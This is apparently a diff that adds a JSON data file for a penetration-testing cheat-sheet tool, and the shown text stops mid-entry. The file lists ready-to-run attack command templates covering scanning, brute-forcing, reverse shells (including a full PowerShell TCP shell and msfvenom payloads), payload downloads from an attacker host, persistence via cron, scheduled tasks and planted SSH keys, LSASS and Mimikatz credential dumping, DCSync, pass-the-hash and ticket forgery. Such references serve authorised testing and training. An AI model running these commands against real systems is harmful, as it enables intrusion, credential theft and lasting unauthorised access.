@@ -1,0 +1,703 @@
+{
+  "version": "1.0",
+  "label": "pentest",
+  "updatedDate": "2026.05.04",
+  "categories": [
+    {
+      "id": "recon",
+      "title": "Reconnaissance",
+      "desc": "Passive & active host/network discovery",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"12\" cy=\"12\" r=\"4\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M12 2v3M12 19v3M2 12h3M19 12h3\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><path d=\"M4.9 4.9l2.1 2.1M17 17l2.1 2.1M4.9 19.1l2.1-2.1M17 7l2.1-2.1\" stroke=\"#FCD200\" stroke-width=\"1.2\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-recon",
+      "items": [
+        {
+          "id": "recon-001",
+          "name": "Ping sweep (fast)",
+          "description": "Find live hosts on a /24 with one packet each.",
+          "template": "nmap -sn -PE -n --min-rate 1000 10.10.10.0/24"
+        },
+        {
+          "id": "recon-002",
+          "name": "DNS — quick recon",
+          "description": "Common record types in one shot.",
+          "template": "dig +short ANY target.tld @8.8.8.8 ; dig AXFR target.tld @ns1.target.tld"
+        },
+        {
+          "id": "recon-003",
+          "name": "Subdomain bruteforce",
+          "description": "Resolve subs with mass-resolver.",
+          "template": "subfinder -d target.tld -all -silent | dnsx -silent -resp"
+        },
+        {
+          "id": "recon-004",
+          "name": "WHOIS / ASN",
+          "description": "Pivot to ranges owned by the org.",
+          "template": "whois -h whois.cymru.com ' -v 8.8.8.8'"
+        },
+        {
+          "id": "recon-005",
+          "name": "theHarvester",
+          "description": "OSINT emails & subs from public sources.",
+          "template": "theHarvester -d target.tld -b all -l 500"
+        },
+        {
+          "id": "recon-006",
+          "name": "ARP scan (LAN)",
+          "description": "Layer-2 host discovery — never lies.",
+          "template": "sudo arp-scan --localnet"
+        }
+      ]
+    },
+    {
+      "id": "scanning",
+      "title": "Port Scanning",
+      "desc": "Service & version discovery",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 3v4M12 17v4\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><path d=\"M12 12l7-4M12 12l-7-4\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/><circle cx=\"12\" cy=\"12\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M5 6c-1.5 1.5-2.5 4-2.5 6s1 4.5 2.5 6M19 6c1.5 1.5 2.5 4 2.5 6s-1 4.5-2.5 6\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-recon",
+      "items": [
+        {
+          "id": "scanning-001",
+          "name": "Nmap — full TCP",
+          "description": "All 65535 TCP ports, fast.",
+          "template": "sudo nmap -p- -T4 --min-rate 5000 -Pn -oA scans/full {RHOST}"
+        },
+        {
+          "id": "scanning-002",
+          "name": "Nmap — service & default scripts",
+          "description": "Targeted follow-up on found ports.",
+          "template": "sudo nmap -sC -sV -p 22,80,445 -oA scans/svc {RHOST}"
+        },
+        {
+          "id": "scanning-003",
+          "name": "Nmap — UDP top 100",
+          "description": "UDP is slow; top-N is plenty.",
+          "template": "sudo nmap -sU --top-ports 100 -oA scans/udp {RHOST}"
+        },
+        {
+          "id": "scanning-004",
+          "name": "Masscan — sweep ranges",
+          "description": "Internet-scale port discovery.",
+          "template": "sudo masscan -p1-65535 10.10.10.0/24 --rate=10000 -oG masscan.gnmap"
+        },
+        {
+          "id": "scanning-005",
+          "name": "Naabu — fast TCP",
+          "description": "SYN scan with connect-timeout tuning.",
+          "template": "naabu -host {RHOST} -p - -rate 5000 -o naabu.txt"
+        },
+        {
+          "id": "scanning-006",
+          "name": "Nmap — vuln scripts",
+          "description": "NSE vuln category against known ports.",
+          "template": "sudo nmap --script vuln -p 80,443,445 {RHOST}"
+        }
+      ]
+    },
+    {
+      "id": "web",
+      "title": "Web Enumeration",
+      "desc": "Directory, vhost & app fingerprinting",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"12\" cy=\"12\" r=\"9.5\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><ellipse cx=\"12\" cy=\"12\" rx=\"4\" ry=\"9.5\" stroke=\"#FCD200\" stroke-width=\"1.3\"/><line x1=\"2.5\" y1=\"12\" x2=\"21.5\" y2=\"12\" stroke=\"#FCD200\" stroke-width=\"1.3\"/><path d=\"M4 7h16M4 17h16\" stroke=\"#FCD200\" stroke-width=\"1\" opacity=\".5\"/></svg>",
+      "tag": "t-recon",
+      "items": [
+        {
+          "id": "web-001",
+          "name": "Feroxbuster — recursive dir-busting",
+          "description": "Fast, recursive, status-filtered.",
+          "template": "feroxbuster -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50 -x php,html,txt"
+        },
+        {
+          "id": "web-002",
+          "name": "Gobuster — vhosts",
+          "description": "Find virtual hosts behind shared IPs.",
+          "template": "gobuster vhost -u {URL} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain"
+        },
+        {
+          "id": "web-003",
+          "name": "ffuf — parameter fuzzing",
+          "description": "Discover hidden GET params.",
+          "template": "ffuf -u '{URL}/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0"
+        },
+        {
+          "id": "web-004",
+          "name": "WhatWeb — fingerprint",
+          "description": "Identify CMS, frameworks, libraries.",
+          "template": "whatweb -a 3 {URL}"
+        },
+        {
+          "id": "web-005",
+          "name": "Nikto",
+          "description": "Quick & noisy — finds the obvious.",
+          "template": "nikto -h {URL} -Tuning x6"
+        },
+        {
+          "id": "web-006",
+          "name": "WPScan — WordPress",
+          "description": "User & plugin enum with API token.",
+          "template": "wpscan --url {URL} --enumerate u,vp --api-token TOKEN"
+        },
+        {
+          "id": "web-007",
+          "name": "SQLMap — auto SQLi",
+          "description": "Detect & dump from a request file.",
+          "template": "sqlmap -r req.txt --batch --risk=2 --level=3 --dbs"
+        }
+      ]
+    },
+    {
+      "id": "smb",
+      "title": "SMB / NetBIOS",
+      "desc": "Shares, sessions, users, vulnerabilities",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M3 6c0-1 .8-1.8 1.8-1.8h5.4l2.4 2.4h7.6c1 0 1.8.8 1.8 1.8v10.8c0 1-.8 1.8-1.8 1.8H4.8C3.8 21 3 20.2 3 19.2V6z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><line x1=\"8\" y1=\"13\" x2=\"16\" y2=\"13\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/><line x1=\"8\" y1=\"16\" x2=\"13\" y2=\"16\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-recon",
+      "items": [
+        {
+          "id": "smb-001",
+          "name": "smbclient — list shares",
+          "description": "Anonymous share listing.",
+          "template": "smbclient -L //{RHOST} -N"
+        },
+        {
+          "id": "smb-002",
+          "name": "netexec — null session",
+          "description": "Quick host probe (nxc).",
+          "template": "nxc smb {RHOST} -u '' -p ''"
+        },
+        {
+          "id": "smb-003",
+          "name": "enum4linux-ng",
+          "description": "Modernized enum4linux.",
+          "template": "enum4linux-ng -A {RHOST}"
+        },
+        {
+          "id": "smb-004",
+          "name": "smbmap — share perms",
+          "description": "Read/write per share, very fast.",
+          "template": "smbmap -H {RHOST} -u guest -p ''"
+        },
+        {
+          "id": "smb-005",
+          "name": "rpcclient — null bind",
+          "description": "User & group enum via RPC.",
+          "template": "rpcclient -U '' -N {RHOST} -c 'enumdomusers;querydominfo'"
+        }
+      ]
+    },
+    {
+      "id": "netsvc",
+      "title": "Other Network Services",
+      "desc": "FTP, SNMP, NFS, LDAP, RDP, SMTP, DNS",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M9 3v4M15 3v4\" stroke=\"#FCD200\" stroke-width=\"1.8\" stroke-linecap=\"round\"/><path d=\"M6 7h12v4c0 4-2.7 7-6 7s-6-3-6-7V7z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><line x1=\"12\" y1=\"18\" x2=\"12\" y2=\"22\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><line x1=\"8\" y1=\"22\" x2=\"16\" y2=\"22\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-recon",
+      "items": [
+        {
+          "id": "netsvc-001",
+          "name": "FTP anonymous",
+          "description": "Quick check + recursive listing.",
+          "template": "ftp -inv {RHOST} <<<$'user anonymous anon\\nls -R\\nquit'"
+        },
+        {
+          "id": "netsvc-002",
+          "name": "SNMP — onesixtyone + snmpwalk",
+          "description": "Find the community, then walk.",
+          "template": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {RHOST} ; snmpwalk -v2c -c public {RHOST}"
+        },
+        {
+          "id": "netsvc-003",
+          "name": "NFS — list & mount",
+          "description": "Read every export.",
+          "template": "showmount -e {RHOST} ; sudo mount -t nfs {RHOST}:/srv /mnt/nfs -o nolock"
+        },
+        {
+          "id": "netsvc-004",
+          "name": "LDAP — anonymous bind",
+          "description": "Domain naming context discovery.",
+          "template": "ldapsearch -x -H ldap://{RHOST} -s base namingcontexts"
+        },
+        {
+          "id": "netsvc-005",
+          "name": "SMTP — VRFY user enum",
+          "description": "Old-school user enum via VRFY/EXPN.",
+          "template": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t {RHOST}"
+        },
+        {
+          "id": "netsvc-006",
+          "name": "RDP — security check",
+          "description": "NLA & cert details before login attempts.",
+          "template": "nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info {RHOST}"
+        }
+      ]
+    },
+    {
+      "id": "creds",
+      "title": "Password Attacks",
+      "desc": "Hash cracking, online bruteforce, mutation",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"8\" cy=\"10\" r=\"5\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><circle cx=\"8\" cy=\"10\" r=\"2\" stroke=\"#FCD200\" stroke-width=\"1.2\" opacity=\".5\"/><path d=\"M12.5 12.5L21 21\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><path d=\"M17 17l3-1M19 19l1-3\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-priv",
+      "items": [
+        {
+          "id": "creds-001",
+          "name": "Hashcat — NTLM (mode 1000)",
+          "description": "Wordlist + best64 ruleset.",
+          "template": "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+        },
+        {
+          "id": "creds-002",
+          "name": "Hashcat — Kerberos AS-REP (18200)",
+          "description": "Roastable accounts.",
+          "template": "hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule"
+        },
+        {
+          "id": "creds-003",
+          "name": "Hashcat — Kerberos TGS (13100)",
+          "description": "Kerberoast cracking.",
+          "template": "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"
+        },
+        {
+          "id": "creds-004",
+          "name": "John the Ripper",
+          "description": "Format autodetect + rules.",
+          "template": "john --wordlist=rockyou.txt --rules=Jumbo hashes.txt"
+        },
+        {
+          "id": "creds-005",
+          "name": "Hydra — SSH bruteforce",
+          "description": "Throttled, with username list.",
+          "template": "hydra -L users.txt -P passwords.txt ssh://{RHOST} -t 4 -f"
+        },
+        {
+          "id": "creds-006",
+          "name": "Hydra — HTTP form",
+          "description": "POST login form bruteforce.",
+          "template": "hydra -l admin -P rockyou.txt {RHOST} http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'"
+        },
+        {
+          "id": "creds-007",
+          "name": "CeWL — site wordlist",
+          "description": "Build a custom wordlist from the site.",
+          "template": "cewl -d 2 -m 6 -w wl.txt {URL}"
+        },
+        {
+          "id": "creds-008",
+          "name": "hash-identifier / hashid",
+          "description": "Quickly classify unknown hashes.",
+          "template": "hashid -m hash.txt"
+        }
+      ]
+    },
+    {
+      "id": "exploit",
+      "title": "Exploitation",
+      "desc": "Public exploits, payloads, listeners, shells",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"12\" cy=\"12\" r=\"3\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M12 2v5M12 17v5M2 12h5M17 12h5\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><circle cx=\"12\" cy=\"12\" r=\"8\" stroke=\"#FCD200\" stroke-width=\"1.2\" stroke-dasharray=\"3 3\"/></svg>",
+      "tag": "t-exploit",
+      "items": [
+        {
+          "id": "exploit-001",
+          "name": "searchsploit — local Exploit-DB",
+          "description": "Find PoCs by service banner.",
+          "template": "searchsploit \"vsftpd 2.3.4\" ; searchsploit -m linux/remote/49757.py"
+        },
+        {
+          "id": "exploit-002",
+          "name": "msfvenom — Linux reverse shell ELF",
+          "description": "Standalone reverse shell binary.",
+          "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf"
+        },
+        {
+          "id": "exploit-003",
+          "name": "msfvenom — Windows reverse shell EXE",
+          "description": "x64, PE, simple.",
+          "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o sh.exe"
+        },
+        {
+          "id": "exploit-004",
+          "name": "msfvenom — PHP webshell",
+          "description": "Drop into a writable webroot.",
+          "template": "msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -o shell.php"
+        },
+        {
+          "id": "exploit-005",
+          "name": "netcat listener",
+          "description": "Classic catcher.",
+          "template": "nc -lvnp {LPORT}"
+        },
+        {
+          "id": "exploit-006",
+          "name": "rlwrap + nc (better history)",
+          "description": "Arrow keys + tab completion in shell.",
+          "template": "rlwrap -cAr nc -lvnp {LPORT}"
+        },
+        {
+          "id": "exploit-007",
+          "name": "Bash TTY upgrade",
+          "description": "After landing — get a real PTY.",
+          "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ; export TERM=xterm ; stty raw -echo;fg"
+        },
+        {
+          "id": "exploit-008",
+          "name": "PowerShell one-liner reverse shell",
+          "description": "Drop straight into a Win shell.",
+          "template": "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()}\""
+        }
+      ]
+    },
+    {
+      "id": "transfer",
+      "title": "File Transfer",
+      "desc": "Move tools to and from the target",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"3\" y=\"4\" width=\"18\" height=\"16\" rx=\"2\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M8 12l4-4 4 4\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/><line x1=\"12\" y1=\"8\" x2=\"12\" y2=\"17\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-post",
+      "items": [
+        {
+          "id": "transfer-001",
+          "name": "Python web server",
+          "description": "Quick HTTP server in your loot dir.",
+          "template": "python3 -m http.server 8000"
+        },
+        {
+          "id": "transfer-002",
+          "name": "Linux — wget / curl",
+          "description": "Pull from your kit, save to /tmp.",
+          "template": "wget http://{LHOST}:8000/linpeas.sh -O /tmp/lp.sh ; curl -sSf http://{LHOST}:8000/lp.sh -o /tmp/lp.sh"
+        },
+        {
+          "id": "transfer-003",
+          "name": "Windows — PowerShell IWR",
+          "description": "Download to disk.",
+          "template": "powershell -nop -c \"iwr http://{LHOST}:8000/winpeas.exe -OutFile C:\\Users\\Public\\wp.exe\""
+        },
+        {
+          "id": "transfer-004",
+          "name": "Windows — certutil",
+          "description": "LOLBin classic.",
+          "template": "certutil -urlcache -split -f http://{LHOST}:8000/nc.exe C:\\Windows\\Temp\\nc.exe"
+        },
+        {
+          "id": "transfer-005",
+          "name": "SMB — impacket-smbserver",
+          "description": "Mount your loot as a share.",
+          "template": "impacket-smbserver share . -smb2support -username pent -password Pass123"
+        },
+        {
+          "id": "transfer-006",
+          "name": "SCP",
+          "description": "When you have an SSH key.",
+          "template": "scp -i id_rsa user@{RHOST}:/etc/passwd ./loot/"
+        }
+      ]
+    },
+    {
+      "id": "linprivesc",
+      "title": "Linux Privilege Escalation",
+      "desc": "sudo, SUID, kernel, cron, capabilities, paths",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 3c-2.5 0-4.5 2-4.5 5v3c0 2-.8 3.5-2.5 5h14c-1.7-1.5-2.5-3-2.5-5V8c0-3-2-5-4.5-5z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><circle cx=\"10\" cy=\"8\" r=\"1\" fill=\"#FCD200\"/><circle cx=\"14\" cy=\"8\" r=\"1\" fill=\"#FCD200\"/><path d=\"M10 11h4\" stroke=\"#FCD200\" stroke-width=\"1\" stroke-linecap=\"round\"/><path d=\"M7 16l-1.5 4M17 16l1.5 4\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><line x1=\"5.5\" y1=\"20\" x2=\"9\" y2=\"20\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/><line x1=\"15\" y1=\"20\" x2=\"18.5\" y2=\"20\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-priv",
+      "items": [
+        {
+          "id": "linprivesc-001",
+          "name": "linpeas.sh",
+          "description": "All-in-one privesc enumerator.",
+          "template": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+        },
+        {
+          "id": "linprivesc-002",
+          "name": "sudo -l",
+          "description": "What can you run as root?",
+          "template": "sudo -l"
+        },
+        {
+          "id": "linprivesc-003",
+          "name": "SUID binaries",
+          "description": "Anything outside the usual list = candidate.",
+          "template": "find / -perm -4000 -type f 2>/dev/null"
+        },
+        {
+          "id": "linprivesc-004",
+          "name": "Capabilities",
+          "description": "+ep on something weird = privesc.",
+          "template": "getcap -r / 2>/dev/null"
+        },
+        {
+          "id": "linprivesc-005",
+          "name": "World-writable in PATH",
+          "description": "Hijack a binary you can rewrite.",
+          "template": "find / -writable -type d 2>/dev/null ; echo $PATH"
+        },
+        {
+          "id": "linprivesc-006",
+          "name": "GTFOBins lookup",
+          "description": "Local copy or web — abuse the binary.",
+          "template": "xdg-open https://gtfobins.github.io/#$(which BINARY)"
+        },
+        {
+          "id": "linprivesc-007",
+          "name": "Cron — writable jobs",
+          "description": "Look for tasks running as root that you can edit.",
+          "template": "cat /etc/crontab ; ls -la /etc/cron.* /var/spool/cron/* 2>/dev/null"
+        },
+        {
+          "id": "linprivesc-008",
+          "name": "pspy — passive proc watcher",
+          "description": "Watch for cron/interactive root tasks.",
+          "template": "./pspy64 -pf -i 1000"
+        }
+      ]
+    },
+    {
+      "id": "winprivesc",
+      "title": "Windows Privilege Escalation",
+      "desc": "Tokens, services, AlwaysInstallElevated, paths",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M3 5.5l8-1.2v7.2H3V5.5z\" stroke=\"#FCD200\" stroke-width=\"1.4\" stroke-linejoin=\"round\"/><path d=\"M13 3.8l8-1.3v9H13V3.8z\" stroke=\"#FCD200\" stroke-width=\"1.4\" stroke-linejoin=\"round\"/><path d=\"M3 13h8v7.2l-8-1.2V13z\" stroke=\"#FCD200\" stroke-width=\"1.4\" stroke-linejoin=\"round\"/><path d=\"M13 13h8v9l-8-1.3V13z\" stroke=\"#FCD200\" stroke-width=\"1.4\" stroke-linejoin=\"round\"/></svg>",
+      "tag": "t-priv",
+      "items": [
+        {
+          "id": "winprivesc-001",
+          "name": "winPEAS",
+          "description": "Run from local copy after transfer.",
+          "template": "C:\\Users\\Public\\winPEASx64.exe quiet cmd"
+        },
+        {
+          "id": "winprivesc-002",
+          "name": "whoami /priv & /groups",
+          "description": "Look for SeImpersonate, SeBackup, etc.",
+          "template": "whoami /all"
+        },
+        {
+          "id": "winprivesc-003",
+          "name": "Service permissions — accesschk",
+          "description": "Modifiable services.",
+          "template": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula"
+        },
+        {
+          "id": "winprivesc-004",
+          "name": "Unquoted service paths",
+          "description": "Classic Windows misconfig.",
+          "template": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\""
+        },
+        {
+          "id": "winprivesc-005",
+          "name": "AlwaysInstallElevated",
+          "description": "Both keys = SYSTEM via MSI.",
+          "template": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated ; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+        },
+        {
+          "id": "winprivesc-006",
+          "name": "PrintNightmare / PrintSpoofer / SeImpersonate",
+          "description": "SeImpersonate → SYSTEM.",
+          "template": "PrintSpoofer.exe -i -c cmd"
+        },
+        {
+          "id": "winprivesc-007",
+          "name": "Stored creds — cmdkey & files",
+          "description": "Find saved RDP/SMB creds.",
+          "template": "cmdkey /list ; findstr /SI /M \"password\" *.xml *.ini *.txt"
+        }
+      ]
+    },
+    {
+      "id": "ad",
+      "title": "Active Directory",
+      "desc": "Kerberos, ACL abuse, BloodHound",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"4\" y=\"4\" width=\"16\" height=\"17\" rx=\"1.5\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><rect x=\"7\" y=\"7\" width=\"3.5\" height=\"3\" rx=\".5\" stroke=\"#FCD200\" stroke-width=\"1.2\"/><rect x=\"13.5\" y=\"7\" width=\"3.5\" height=\"3\" rx=\".5\" stroke=\"#FCD200\" stroke-width=\"1.2\"/><rect x=\"7\" y=\"13\" width=\"3.5\" height=\"3\" rx=\".5\" stroke=\"#FCD200\" stroke-width=\"1.2\"/><rect x=\"13.5\" y=\"13\" width=\"3.5\" height=\"3\" rx=\".5\" stroke=\"#FCD200\" stroke-width=\"1.2\"/><line x1=\"12\" y1=\"18\" x2=\"12\" y2=\"21\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-priv",
+      "items": [
+        {
+          "id": "ad-001",
+          "name": "BloodHound — collection (SharpHound)",
+          "description": "All collection methods, ZIP output.",
+          "template": "SharpHound.exe -c All --zipfilename loot.zip"
+        },
+        {
+          "id": "ad-002",
+          "name": "BloodHound — Linux (bloodhound.py)",
+          "description": "From an attacker box with creds.",
+          "template": "bloodhound-python -u user -p '{PASS}' -d {DOMAIN} -ns {RHOST} -c All"
+        },
+        {
+          "id": "ad-003",
+          "name": "Kerberoast — GetUserSPNs",
+          "description": "Crackable TGS for SPN-bearing users.",
+          "template": "impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {RHOST} -request -outputfile tgs.txt"
+        },
+        {
+          "id": "ad-004",
+          "name": "ASREPRoast",
+          "description": "Users without pre-auth.",
+          "template": "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -no-pass -dc-ip {RHOST}"
+        },
+        {
+          "id": "ad-005",
+          "name": "Password spray — nxc",
+          "description": "Slow, smart, lockout-aware.",
+          "template": "nxc smb {RHOST} -u users.txt -p 'Spring2026!' --continue-on-success"
+        },
+        {
+          "id": "ad-006",
+          "name": "DCSync — secretsdump",
+          "description": "Dump NTDS hashes once you have replication rights.",
+          "template": "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{RHOST} -just-dc"
+        },
+        {
+          "id": "ad-007",
+          "name": "Pass-the-Hash — psexec",
+          "description": "NTLM hash → SYSTEM shell.",
+          "template": "impacket-psexec {DOMAIN}/{USER}@{RHOST} -hashes :{HASH}"
+        },
+        {
+          "id": "ad-008",
+          "name": "Silver / Golden ticket",
+          "description": "Forge a TGS / TGT — rubeus or ticketer.",
+          "template": "impacket-ticketer -nthash NT -domain-sid S-1-5-21-... -domain {DOMAIN} Administrator"
+        }
+      ]
+    },
+    {
+      "id": "pivot",
+      "title": "Pivoting & Tunneling",
+      "desc": "Reach internal networks through a foothold",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"4\" cy=\"12\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.4\"/><circle cx=\"12\" cy=\"5\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.4\"/><circle cx=\"12\" cy=\"19\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.4\"/><circle cx=\"20\" cy=\"12\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.4\"/><path d=\"M6.3 11L9.5 6.5M6.3 13l3.2 4.5M14.5 6.5l3.2 4.5M14.5 17.5l3.2-4.5\" stroke=\"#FCD200\" stroke-width=\"1.2\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-post",
+      "items": [
+        {
+          "id": "pivot-001",
+          "name": "Chisel — reverse SOCKS",
+          "description": "Server on attacker, client on target.",
+          "template": "# attacker: ./chisel server -p 8000 --reverse\\n# target:   ./chisel client {LHOST}:8000 R:1080:socks"
+        },
+        {
+          "id": "pivot-002",
+          "name": "SSH dynamic SOCKS",
+          "description": "When you have SSH on a pivot host.",
+          "template": "ssh -D 1080 -N -f user@pivot.target"
+        },
+        {
+          "id": "pivot-003",
+          "name": "SSH local port forward",
+          "description": "Bring an internal port to your localhost.",
+          "template": "ssh -L 8081:10.0.0.5:80 user@pivot.target"
+        },
+        {
+          "id": "pivot-004",
+          "name": "sshuttle — VPN-like",
+          "description": "Route a CIDR through SSH.",
+          "template": "sshuttle -r user@pivot.target 10.0.0.0/24"
+        },
+        {
+          "id": "pivot-005",
+          "name": "proxychains",
+          "description": "Send tools through your SOCKS.",
+          "template": "proxychains -q nmap -sT -Pn -n -p 80,445 10.0.0.5"
+        },
+        {
+          "id": "pivot-006",
+          "name": "Ligolo-ng",
+          "description": "Modern TUN-mode pivoting.",
+          "template": "# proxy: ./proxy -selfcert\\n# agent: ./agent -connect {LHOST}:11601 -ignore-cert"
+        }
+      ]
+    },
+    {
+      "id": "post",
+      "title": "Post-Exploitation",
+      "desc": "Persistence, dumping, situational awareness",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M9 3h6v5l4 9c.5 1-.2 2.2-1.3 2.2H6.3C5.2 19.2 4.5 18 5 17l4-9V3z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><line x1=\"9\" y1=\"3\" x2=\"15\" y2=\"3\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><line x1=\"7\" y1=\"15\" x2=\"17\" y2=\"15\" stroke=\"#FCD200\" stroke-width=\"1\" opacity=\".5\"/><circle cx=\"10\" cy=\"17\" r=\"1\" fill=\"#FCD200\" opacity=\".6\"/><circle cx=\"14\" cy=\"16.5\" r=\".7\" fill=\"#FCD200\" opacity=\".6\"/></svg>",
+      "tag": "t-post",
+      "items": [
+        {
+          "id": "post-001",
+          "name": "Linux — persistence via cron",
+          "description": "Quick & dirty back-door.",
+          "template": "(crontab -l;echo '*/5 * * * * /tmp/.x.sh')|crontab -"
+        },
+        {
+          "id": "post-002",
+          "name": "Linux — SSH key drop",
+          "description": "Authorize a key you control.",
+          "template": "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-ed25519 AAA...' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+        },
+        {
+          "id": "post-003",
+          "name": "Windows — scheduled task persistence",
+          "description": "Run on logon as user.",
+          "template": "schtasks /create /tn \"Updater\" /tr \"C:\\Users\\Public\\b.exe\" /sc onlogon /rl HIGHEST /f"
+        },
+        {
+          "id": "post-004",
+          "name": "Mimikatz — sekurlsa",
+          "description": "Dump creds from LSASS (admin needed).",
+          "template": "privilege::debug ; sekurlsa::logonpasswords"
+        },
+        {
+          "id": "post-005",
+          "name": "LSASS dump (procdump)",
+          "description": "Crash-free dump for offline parsing.",
+          "template": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+        },
+        {
+          "id": "post-006",
+          "name": "PowerView — domain context",
+          "description": "Recon from the inside.",
+          "template": "Import-Module .\\PowerView.ps1 ; Get-NetUser -SPN | select samaccountname,serviceprincipalname"
+        },
+        {
+          "id": "post-007",
+          "name": "Linux — cleanup",
+          "description": "Clear bash history & timestamps.",
